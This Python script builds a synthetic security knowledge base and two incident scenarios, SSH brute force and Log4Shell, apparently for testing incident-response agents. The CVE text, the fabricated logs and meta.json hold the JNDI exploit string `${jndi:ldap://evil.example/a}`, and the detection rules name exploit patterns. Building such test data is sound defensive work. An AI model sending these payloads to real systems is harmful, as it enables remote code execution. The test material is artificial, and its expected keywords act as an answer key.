#!/usr/bin/env python3
"""Author the Phase 1 synthetic KB and scenario files. Idempotent."""

from __future__ import annotations

from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent
KB = ROOT / "data" / "kb"
SC = ROOT / "data" / "scenarios"


def write(path: Path, body: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body.lstrip("\n") if body.startswith("\n") else body, encoding="utf-8")


def md(meta: dict, body: str) -> str:
    dumped = yaml.safe_dump(meta, sort_keys=False, allow_unicode=True)
    return f"---\n{dumped}---\n\n{body.strip()}\n"


CVES = [
    (
        "CVE-2021-44228.md",
        {
            "id": "CVE-2021-44228",
            "title": "Log4Shell — Apache Log4j2 JNDI RCE",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["log4j", "jndi", "rce", "log4shell"],
            "severity": "critical",
            "fixed_version": "2.17.1",
            "packages": [
                {
                    "name": "log4j-core",
                    "aliases": ["org.apache.logging.log4j:log4j-core", "log4j"],
                    "introduced": "2.0",
                    "fixed": "2.17.0",
                }
            ],
        },
        """
Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP/RMI
names. A log4j jndi rce is triggered when a crafted string such as
`${jndi:ldap://evil.example/a}` is logged and interpolated. This is Log4Shell.
Remote code execution follows if the JNDI lookup reaches an attacker server.
Affects log4j-core 2.0-beta9 through 2.14.1; upgrade to 2.17.1 or later.
Public-facing APIs that log User-Agent or request paths are the typical blast radius.
""",
    ),
    (
        "CVE-2021-45046.md",
        {
            "id": "CVE-2021-45046",
            "title": "Log4j2 thread-context JNDI follow-on",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["log4j", "jndi"],
            "severity": "critical",
            "fixed_version": "2.17.0",
            "packages": [
                {
                    "name": "log4j-core",
                    "aliases": ["org.apache.logging.log4j:log4j-core"],
                    "introduced": "2.0",
                    "fixed": "2.17.0",
                }
            ],
        },
        "Incomplete Log4Shell fix. Thread Context Lookup patterns can still trigger JNDI. Patch to 2.17.0+.",
    ),
    (
        "CVE-2021-45105.md",
        {
            "id": "CVE-2021-45105",
            "title": "Log4j2 recursive lookup DoS",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["log4j", "dos"],
            "severity": "high",
            "fixed_version": "2.17.0",
            "packages": [
                {"name": "log4j-core", "aliases": ["org.apache.logging.log4j:log4j-core"], "introduced": "2.0", "fixed": "2.17.0"}
            ],
        },
        "Unbounded recursion in lookup substitution causes denial of service. Not RCE; still patch with the Log4Shell train.",
    ),
    (
        "CVE-2019-17571.md",
        {
            "id": "CVE-2019-17571",
            "title": "Log4j 1.x SocketServer deserialization",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["log4j1"],
            "severity": "critical",
            "fixed_version": "migrate-to-2.17.1",
            "packages": [{"name": "log4j", "aliases": ["log4j"], "introduced": "1.2.0", "fixed": "1.2.18"}],
        },
        "Log4j 1.x SocketServer deserializes untrusted data. Distinct from Log4Shell. Do not confuse the two.",
    ),
    (
        "CVE-2024-6387.md",
        {
            "id": "CVE-2024-6387",
            "title": "OpenSSH regreSSHion signal-handler race",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["openssh", "rce"],
            "severity": "high",
            "fixed_version": "9.8p1",
            "packages": [{"name": "openssh", "aliases": ["openssh-server", "sshd"], "introduced": "8.5", "fixed": "9.8p1"}],
        },
        "Race in OpenSSH sshd signal handler can yield remote code execution on glibc. Not required to explain a password-guessing campaign.",
    ),
    (
        "CVE-2018-15473.md",
        {
            "id": "CVE-2018-15473",
            "title": "OpenSSH user enumeration",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["openssh", "enum"],
            "severity": "medium",
            "fixed_version": "7.8",
            "packages": [{"name": "openssh", "aliases": ["openssh-server"], "introduced": "2.3", "fixed": "7.8"}],
        },
        "Timing/response differences let an attacker distinguish valid users. Often a precursor to brute force (T1110).",
    ),
    (
        "CVE-2017-5638.md",
        {
            "id": "CVE-2017-5638",
            "title": "Apache Struts Jakarta Multipart parser RCE",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["struts", "rce"],
            "severity": "critical",
            "fixed_version": "2.3.32",
            "packages": [{"name": "struts2-core", "aliases": ["org.apache.struts:struts2-core"], "introduced": "2.3.5", "fixed": "2.3.32"}],
        },
        "OGNL injection via Content-Type. Classic public-facing application RCE (T1190). Not Log4Shell.",
    ),
    (
        "CVE-2021-41773.md",
        {
            "id": "CVE-2021-41773",
            "title": "Apache HTTP Server path traversal",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["httpd", "traversal"],
            "severity": "high",
            "fixed_version": "2.4.51",
            "packages": [{"name": "httpd", "aliases": ["apache2"], "introduced": "2.4.49", "fixed": "2.4.51"}],
        },
        "Path traversal and possible RCE on misconfigured Apache 2.4.49/2.4.50. Look for `../` in request paths.",
    ),
    (
        "CVE-2014-0160.md",
        {
            "id": "CVE-2014-0160",
            "title": "Heartbleed OpenSSL memory disclosure",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["openssl", "memory"],
            "severity": "high",
            "fixed_version": "1.0.1g",
            "packages": [{"name": "openssl", "aliases": ["libssl"], "introduced": "1.0.1", "fixed": "1.0.1g"}],
        },
        "Heartbeat extension leaks process memory. Historical; included so retrieval has a distractor.",
    ),
    (
        "CVE-2022-22965.md",
        {
            "id": "CVE-2022-22965",
            "title": "Spring4Shell data-binding RCE",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["spring", "rce"],
            "severity": "critical",
            "fixed_version": "5.3.18",
            "packages": [{"name": "spring-beans", "aliases": ["org.springframework:spring-beans"], "introduced": "5.3.0", "fixed": "5.3.18"}],
        },
        "Class-loader manipulation through Spring request binding. Another T1190 public-API RCE, distinct from Log4Shell.",
    ),
    (
        "CVE-2021-3129.md",
        {
            "id": "CVE-2021-3129",
            "title": "Laravel Ignition debug RCE",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["laravel", "rce"],
            "severity": "critical",
            "fixed_version": "2.5.2",
            "packages": [{"name": "facade/ignition", "aliases": ["ignition"], "introduced": "2.0.0", "fixed": "2.5.2"}],
        },
        "Debug-mode RCE in Laravel Ignition. Only relevant if PHP debug tooling is exposed.",
    ),
    (
        "CVE-2023-44487.md",
        {
            "id": "CVE-2023-44487",
            "title": "HTTP/2 Rapid Reset",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["http2", "dos"],
            "severity": "high",
            "fixed_version": "vendor-advisory",
            "packages": [{"name": "nginx", "aliases": ["nginx"], "introduced": "1.0", "fixed": "1.25.3"}],
        },
        "HTTP/2 stream cancellation flood. Availability issue, not an auth-bypass or RCE.",
    ),
    (
        "CVE-2022-42889.md",
        {
            "id": "CVE-2022-42889",
            "title": "Apache Commons Text interpolation RCE",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["commons-text", "rce"],
            "severity": "critical",
            "fixed_version": "1.10.0",
            "packages": [
                {
                    "name": "commons-text",
                    "aliases": ["org.apache.commons:commons-text"],
                    "introduced": "1.5",
                    "fixed": "1.10.0",
                }
            ],
        },
        "StringSubstitutor interpolators (script, dns, url) can execute attacker input. Similar flavor to Log4Shell, different library.",
    ),
    (
        "CVE-2023-38545.md",
        {
            "id": "CVE-2023-38545",
            "title": "curl SOCKS5 heap overflow",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["curl"],
            "severity": "high",
            "fixed_version": "8.4.0",
            "packages": [{"name": "curl", "aliases": ["libcurl"], "introduced": "7.69.0", "fixed": "8.4.0"}],
        },
        "Heap overflow in SOCKS5 hostname handling. Client-side; not a web-API JNDI issue.",
    ),
    (
        "CVE-2022-22963.md",
        {
            "id": "CVE-2022-22963",
            "title": "Spring Cloud Function SpEL RCE",
            "source": "NVD (local excerpt)",
            "type": "cve",
            "tags": ["spring", "rce"],
            "severity": "critical",
            "fixed_version": "3.2.3",
            "packages": [
                {
                    "name": "spring-cloud-function-context",
                    "aliases": ["org.springframework.cloud:spring-cloud-function-context"],
                    "introduced": "3.1.0",
                    "fixed": "3.2.3",
                }
            ],
        },
        "Routing-expression SpEL injection via HTTP headers. Public-facing function endpoints.",
    ),
]

MITRE = [
    ("T1110.md", {"id": "T1110", "title": "Brute Force", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["credential", "ssh"], "severity": "high"},
     "Adversaries attempt to gain access by systematically guessing passwords or using dumped hashes. Repeated failed password events from one source IP against sshd, especially followed by a success, are the textbook signal. Sub-techniques include password guessing (T1110.001) and password spraying (T1110.003)."),
    ("T1110.001.md", {"id": "T1110.001", "title": "Password Guessing", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["credential"], "severity": "high"},
     "Guessing passwords against a single account or a short list. High-volume Failed password lines for root/admin/ubuntu from one IP are password guessing, not spraying."),
    ("T1190.md", {"id": "T1190", "title": "Exploit Public-Facing Application", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["rce", "web"], "severity": "critical"},
     "Use of an exploit against a public-facing service — HTTP APIs, VPN, web servers. Log4Shell JNDI payloads in request paths or headers, Struts OGNL, and Spring4Shell are T1190. Successful exploitation often yields remote code execution."),
    ("T1078.md", {"id": "T1078", "title": "Valid Accounts", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["credential"], "severity": "high"},
     "Use of legitimate credentials after they are obtained. A successful SSH login from the same IP that just brute-forced the box is Valid Accounts, not a software exploit."),
    ("T1078.003.md", {"id": "T1078.003", "title": "Local Accounts", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["account"], "severity": "high"},
     "Abuse of local accounts, including ones the attacker creates post-compromise (`useradd`, `adduser`). Persistence and privilege staging."),
    ("T1059.md", {"id": "T1059", "title": "Command and Scripting Interpreter", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["execution"], "severity": "high"},
     "Execution via a shell or interpreter. sudo invocations and bash one-liners after an SSH login are T1059 / T1059.004."),
    ("T1059.004.md", {"id": "T1059.004", "title": "Unix Shell", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["execution"], "severity": "high"},
     "Unix shell after interactive or scripted login. Pair with sudo logs and unexpected `useradd` / `scp` / `ssh` to other hosts."),
    ("T1021.md", {"id": "T1021", "title": "Remote Services", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["lateral"], "severity": "high"},
     "Lateral movement over remote services (RDP, SMB, SSH). Internal SSH from a newly compromised bastion is T1021."),
    ("T1021.004.md", {"id": "T1021.004", "title": "SSH Lateral Movement", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["lateral", "ssh"], "severity": "high"},
     "Use SSH to hop to a second host. Look for outbound ssh to RFC1918 addresses shortly after a suspicious Accept."),
    ("T1136.md", {"id": "T1136", "title": "Create Account", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["persistence"], "severity": "medium"},
     "Creation of an account for persistence. `useradd` / `adduser` immediately after a remote login is the common Unix form (T1136.001 local)."),
    ("T1046.md", {"id": "T1046", "title": "Network Service Discovery", "source": "MITRE ATT&CK", "type": "mitre", "tags": ["discovery"], "severity": "low"},
     "Scanning for listening services. Often precedes brute force or public-exploit attempts. Noise unless paired with later success."),
]

CONTROLS = [
    ("AC-7.md", {"id": "AC-7", "title": "AC-7 Unsuccessful Logon Attempts", "source": "NIST 800-53", "type": "controls", "tags": ["nist", "auth"], "severity": "high"},
     "Enforce a limit of consecutive unsuccessful logon attempts and automatically lock or delay the account/source. Absence of fail2ban, sshd MaxAuthTries hardening, or lockout after repeated failed password events is a FAIL for brute-force incidents."),
    ("AU-6.md", {"id": "AU-6", "title": "AU-6 Audit Record Review, Analysis, and Reporting", "source": "NIST 800-53", "type": "controls", "tags": ["nist", "logging"], "severity": "medium"},
     "Review and analyze audit records for indications of inappropriate activity. A multi-hour SSH guessing campaign that is only noticed by an offline agent implies AU-6 is partial or failing."),
    ("SI-4.md", {"id": "SI-4", "title": "SI-4 System Monitoring", "source": "NIST 800-53", "type": "controls", "tags": ["nist", "detect"], "severity": "high"},
     "Monitor the system to detect attacks and indicators of potential attacks. JNDI payloads hitting a public API, or SSH success-after-failures, should have generated an alert. Missing detections are an SI-4 gap."),
    ("RA-5.md", {"id": "RA-5", "title": "RA-5 Vulnerability Monitoring and Scanning", "source": "NIST 800-53", "type": "controls", "tags": ["nist", "vuln"], "severity": "critical"},
     "Scan for vulnerabilities in the system and hosted applications, and remediate. Shipping log4j-core 2.14.1 in 2024 is an RA-5 failure — Log4Shell has been in every scanner since December 2021."),
    ("CM-6.md", {"id": "CM-6", "title": "CM-6 Configuration Settings", "source": "NIST 800-53", "type": "controls", "tags": ["nist", "config"], "severity": "high"},
     "Establish and document configuration settings. Unhardened sshd (password auth, root guessable) and default Log4j message lookups are CM-6 gaps."),
    ("CC6.1.md", {"id": "CC6.1", "title": "CC6.1 Logical and Physical Access Controls", "source": "SOC 2", "type": "controls", "tags": ["soc2", "access"], "severity": "high"},
     "Restrict logical access to authorized users. Password-only SSH exposed to the internet, no MFA, and no lockout after failed attempts fails CC6.1."),
    ("CC6.6.md", {"id": "CC6.6", "title": "CC6.6 Restrict Access from Outside", "source": "SOC 2", "type": "controls", "tags": ["soc2", "boundary"], "severity": "high"},
     "Implement controls to prevent or detect unauthorized access from outside parties. A public API evaluating JNDI and an sshd reachable from a Tor-ish VPS without allow-listing fail CC6.6."),
    ("CC7.1.md", {"id": "CC7.1", "title": "CC7.1 Detect and Monitor", "source": "SOC 2", "type": "controls", "tags": ["soc2", "detect"], "severity": "medium"},
     "Detect and monitor configuration changes and anomalies. New local accounts and unexpected sudo after a foreign login should be monitored."),
    ("CC7.2.md", {"id": "CC7.2", "title": "CC7.2 Monitor Anomalies", "source": "SOC 2", "type": "controls", "tags": ["soc2", "detect"], "severity": "high"},
     "Monitor the system for anomalies — including exploit payloads such as `${jndi:` and brute-force histograms. Lack of a Sigma/detection rule is a gap."),
    ("CC7.3.md", {"id": "CC7.3", "title": "CC7.3 Evaluate Security Events", "source": "SOC 2", "type": "controls", "tags": ["soc2", "ir"], "severity": "high"},
     "Evaluate security events to determine if they are security incidents and respond. This control is why Incident Response must produce a phased plan, not just a finding list."),
]

RUNBOOKS = [
    ("rb-ssh-brute-force.md", {"id": "rb-ssh-brute-force", "title": "SSH brute-force containment", "source": "internal IR", "type": "runbooks", "tags": ["ssh", "brute"], "severity": "high"},
     """Contain first: block the source IP at the edge and in hosts.allow/iptables. Disable password authentication if key auth is already in use. Snapshot auth.log and lastlog. Do not reboot yet — preserve volatile sshd state. Then move to credential rotation."""),
    ("rb-credential-rotation.md", {"id": "rb-credential-rotation", "title": "Credential rotation after suspected password compromise", "source": "internal IR", "type": "runbooks", "tags": ["creds"], "severity": "high"},
     """Rotate passwords and SSH keys for every account that saw a successful login from the attacker IP, plus root and any service account touched by sudo. Invalidate agent tokens. Check authorized_keys for implants. Force password expiry."""),
    ("rb-account-containment.md", {"id": "rb-account-containment", "title": "Contain attacker-created local accounts", "source": "internal IR", "type": "runbooks", "tags": ["account"], "severity": "high"},
     """Lock or delete accounts created post-compromise (`useradd`). Review crontab, systemd user units, and ~/.ssh for those UIDs. Preserve the passwd/shadow copies for forensics before deletion."""),
    ("rb-rce-containment.md", {"id": "rb-rce-containment", "title": "Contain a public-facing RCE", "source": "internal IR", "type": "runbooks", "tags": ["rce"], "severity": "critical"},
     """Take the vulnerable endpoint out of the load balancer or WAF-block the exploit pattern (`jndi`, `${`, OGNL). Isolate the compute instance. Capture memory and container filesystem. Assume the process spawned a child — hunt outbound LDAP/RMI/DNS."""),
    ("rb-log4shell-eradication.md", {"id": "rb-log4shell-eradication", "title": "Eradicate Log4Shell", "source": "internal IR", "type": "runbooks", "tags": ["log4j", "rce"], "severity": "critical"},
     """Remove JndiLookup.class or upgrade log4j-core to 2.17.1+. Grep images and hosts for `JndiLookup` and `log4j-core-2.1`. Rotate any secrets the app could read. Rebuild rather than hot-patch when the classloader already loaded the gadget."""),
    ("rb-dependency-patching.md", {"id": "rb-dependency-patching", "title": "Emergency dependency patching", "source": "internal IR", "type": "runbooks", "tags": ["patch"], "severity": "high"},
     """Pin the fixed version in requirements.txt / pom.xml / the image. Rebuild, scan again, deploy. Record the CVE and fixed version in the change ticket. Do not leave a vulnerable JAR on disk even if unused."""),
    ("rb-recover-from-compromise.md", {"id": "rb-recover-from-compromise", "title": "Recover services after containment", "source": "internal IR", "type": "runbooks", "tags": ["recover"], "severity": "medium"},
     """Restore from a pre-incident AMI or image only after IOC hunt is clean. Bring services up behind the WAF/allow-list. Validate health and authentication. Communicate to stakeholders with the risk score and residual risk."""),
    ("rb-harden-ssh.md", {"id": "rb-harden-ssh", "title": "Harden SSH and logging", "source": "internal IR", "type": "runbooks", "tags": ["harden", "ssh"], "severity": "medium"},
     """PasswordAuthentication no, PermitRootLogin no, MaxAuthTries 3, allow-list admin IPs, install fail2ban, ship auth.log to the SIEM with a brute-force correlation rule. Enable MFA for break-glass."""),
]

DETECTIONS = [
    ("det-ssh-brute-force.md", {"id": "det-ssh-brute-force", "title": "SSH repeated failed password", "source": "Sigma-style", "type": "detections", "tags": ["ssh", "T1110"], "severity": "high"},
     """Detect repeated failed password events from a single source IP against sshd.
Condition: count(Failed password OR Invalid user) by src_ip >= 8 within 10 minutes.
This is the primary brute-force rule. Tuning: ignore jump-hosts that naturally fail once."""),
    ("det-success-after-failures.md", {"id": "det-success-after-failures", "title": "SSH success after failures", "source": "Sigma-style", "type": "detections", "tags": ["ssh", "T1078"], "severity": "critical"},
     """Accepted password for a user from an IP that generated repeated failed password lines in the prior window. High confidence compromise of a valid account. Alert immediately; do not wait for user add."""),
    ("det-new-account-after-login.md", {"id": "det-new-account-after-login", "title": "useradd after remote login", "source": "Sigma-style", "type": "detections", "tags": ["T1136"], "severity": "high"},
     """useradd/adduser shortly after an Accepted password from a non-admin jump box. Persistence signal."""),
    ("det-sudo-after-remote-login.md", {"id": "det-sudo-after-remote-login", "title": "sudo after remote SSH login", "source": "Sigma-style", "type": "detections", "tags": ["T1059"], "severity": "medium"},
     """sudo COMMAND= following an SSH Accept from an unusual source. Context rule — pair with brute force or new-geo."""),
    ("det-jndi-ldap-exploit.md", {"id": "det-jndi-ldap-exploit", "title": "JNDI LDAP exploit payload", "source": "Sigma-style", "type": "detections", "tags": ["log4shell", "T1190"], "severity": "critical"},
     """HTTP request or application log contains `${jndi:ldap`, `${jndi:rmi`, or `jndi:dns`. This is the Log4Shell / log4j jndi rce probe or exploit. Any hit on a public API is T1190. Correlate with outbound LDAP from the app host."""),
    ("det-path-traversal.md", {"id": "det-path-traversal", "title": "HTTP path traversal", "source": "Sigma-style", "type": "detections", "tags": ["T1190"], "severity": "medium"},
     """Request path contains `../` or `%2e%2e`. Common scanner noise; escalate when paired with 200s on /etc/passwd or similar."""),
    ("det-suspicious-ua.md", {"id": "det-suspicious-ua", "title": "Exploit-kit user agent", "source": "Sigma-style", "type": "detections", "tags": ["recon"], "severity": "low"},
     """User-Agent contains `${jndi` or known scanner tokens (`masscan`, `nikto`). Low severity alone; raises confidence of a JNDI finding."""),
    ("det-outbound-ldap.md", {"id": "det-outbound-ldap", "title": "Outbound LDAP after HTTP 200", "source": "Sigma-style", "type": "detections", "tags": ["c2", "log4shell"], "severity": "critical"},
     """App host opens TCP/389 or TCP/1389 shortly after serving a request with a JNDI payload. Confirms the lookup fired — treat as successful RCE until proven otherwise."""),
]


def ssh_auth_log() -> str:
    lines = [
        "Jan 15 02:11:04 web-prod sshd[1201]: Failed password for valid_user from 10.0.1.20 port 51111 ssh2",
        "Jan 15 02:11:08 web-prod sshd[1202]: Accepted publickey for alice from 10.0.1.20 port 51112 ssh2",
        "Jan 15 02:40:19 web-prod sshd[1300]: Failed password for invalid user ghost from 203.0.113.88 port 2201 ssh2",
    ]
    for i in range(14):
        user = ["root", "admin", "ubuntu", "root"][i % 4]
        lines.append(
            f"Jan 15 03:12:{i:02d} web-prod sshd[{1400+i}]: Failed password for {user} from 185.220.101.47 port {53100+i} ssh2"
        )
    lines += [
        "Jan 15 03:18:44 web-prod sshd[1890]: Accepted password for ubuntu from 185.220.101.47 port 54001 ssh2",
        "Jan 15 03:18:45 web-prod systemd-logind[1]: New session 88 of user ubuntu",
        "Jan 15 03:19:02 web-prod sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m backup-svc",
        "Jan 15 03:19:03 web-prod useradd[1901]: new user: name=backup-svc, UID=1005, GID=1005, home=/home/backup-svc, shell=/bin/sh",
        "Jan 15 03:20:11 web-prod sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/ssh backup-svc@10.0.2.15",
        "Jan 15 03:20:14 db-int sshd[441]: Accepted password for backup-svc from 10.0.1.8 port 22022 ssh2",
        "Jan 15 04:01:00 web-prod sshd[2002]: Failed password for alice from 10.0.1.20 port 51200 ssh2",
    ]
    return "\n".join(lines) + "\n"


def ssh_syslog() -> str:
    return """Jan 15 03:18:44 web-prod systemd[1]: Started Session 88 of User ubuntu.
Jan 15 03:19:02 web-prod sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=1000)
Jan 15 03:20:10 web-prod ssh[1922]: connecting to 10.0.2.15 port 22
Jan 15 03:21:00 web-prod CRON[1999]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
"""


def log4_nginx() -> str:
    return """10.0.3.12 - - [15/Jan/2024:02:10:01 +0000] "GET /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.27"
203.0.113.40 - - [15/Jan/2024:02:14:22 +0000] "GET /favicon.ico HTTP/1.1" 404 48 "-" "Mozilla/5.0"
198.51.100.77 - - [15/Jan/2024:03:21:01 +0000] "GET /api/v1/orders?q=widget HTTP/1.1" 200 812 "-" "Mozilla/5.0"
185.220.101.91 - - [15/Jan/2024:03:22:09 +0000] "GET /api/v1/${jndi:ldap://evil.example/a} HTTP/1.1" 200 812 "-" "${jndi:ldap://evil.example/ua}"
185.220.101.91 - - [15/Jan/2024:03:22:11 +0000] "GET /api/v1/search HTTP/1.1" 200 140 "http://shop.internal" "Java/1.8.0_181"
203.0.113.40 - - [15/Jan/2024:03:23:00 +0000] "GET /static/not-there.css HTTP/1.1" 404 48 "-" "Mozilla/5.0"
185.220.101.91 - - [15/Jan/2024:03:23:40 +0000] "GET /api/v1/../../etc/passwd HTTP/1.1" 400 12 "-" "curl/8.0"
10.0.3.12 - - [15/Jan/2024:03:24:00 +0000] "GET /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.27"
"""


def log4_app() -> str:
    return """2024-01-15 02:10:01 INFO  Healthcheck ok
2024-01-15 03:21:01 INFO  GET /api/v1/orders status=200
2024-01-15 03:22:09 ERROR Error looking up resource ${jndi:ldap://evil.example/a}
2024-01-15 03:22:09 WARN  javax.naming.InitialContext lookup triggered by JndiLookup
2024-01-15 03:22:10 INFO  outbound connect 185.220.101.91:1389 (ldap)
2024-01-15 03:22:12 ERROR Uncaught exception in request thread — possible classload from remote codebase
2024-01-15 03:23:40 WARN  rejected path traversal /api/v1/../../etc/passwd
"""


def main() -> None:
    for folder, items in (
        ("cve", CVES),
        ("mitre", MITRE),
        ("controls", CONTROLS),
        ("runbooks", RUNBOOKS),
        ("detections", DETECTIONS),
    ):
        for filename, meta, body in items:
            write(KB / folder / filename, md(meta, body))

    write(SC / "ssh_bruteforce" / "auth.log", ssh_auth_log())
    write(SC / "ssh_bruteforce" / "syslog", ssh_syslog())
    write(
        SC / "ssh_bruteforce" / "meta.json",
        """{
  "id": "ssh_bruteforce",
  "title": "SSH brute force to lateral movement",
  "summary": "External IP 185.220.101.47 guessed passwords against sshd, then logged in as ubuntu, created backup-svc, and hopped to 10.0.2.15.",
  "max_iterations": 8,
  "max_visits_per_agent": 1,
  "required_agents": ["log_monitor", "threat_intel", "policy_checker", "incident_response"],
  "terminal_agent": "incident_response",
  "expected_keywords": ["brute", "185.220.101.47", "T1110", "ubuntu", "contain"]
}
""",
    )

    write(
        SC / "log4shell" / "nginx_access.log",
        log4_nginx(),
    )
    write(SC / "log4shell" / "app.log", log4_app())
    write(
        SC / "log4shell" / "requirements.txt",
        "flask==2.2.2\nrequests==2.28.1\n# java: org.apache.logging.log4j:log4j-core==2.14.1\ncommons-text==1.9\n",
    )
    write(
        SC / "log4shell" / "Dockerfile",
        "FROM openjdk:11-jre\nWORKDIR /app\n# vulnerable logging stack used by the public API\nCOPY log4j-core-2.14.1.jar /app/lib/log4j-core-2.14.1.jar\nCOPY app.jar /app/app.jar\nEXPOSE 8080\nCMD [\"java\", \"-jar\", \"app.jar\"]\n",
    )
    write(
        SC / "log4shell" / "meta.json",
        """{
  "id": "log4shell",
  "title": "Log4Shell on a public API",
  "summary": "Public /api/v1 accepted a ${jndi:ldap://evil.example/a} payload. App logged a JNDI lookup. Artifacts pin log4j-core 2.14.1.",
  "max_iterations": 8,
  "max_visits_per_agent": 1,
  "required_agents": ["log_monitor", "threat_intel", "vuln_scanner", "policy_checker", "incident_response"],
  "terminal_agent": "incident_response",
  "expected_keywords": ["CVE-2021-44228", "jndi", "log4j", "2.14.1", "contain"]
}
""",
    )
    print("Wrote KB + scenarios.")


if __name__ == "__main__":
    main()
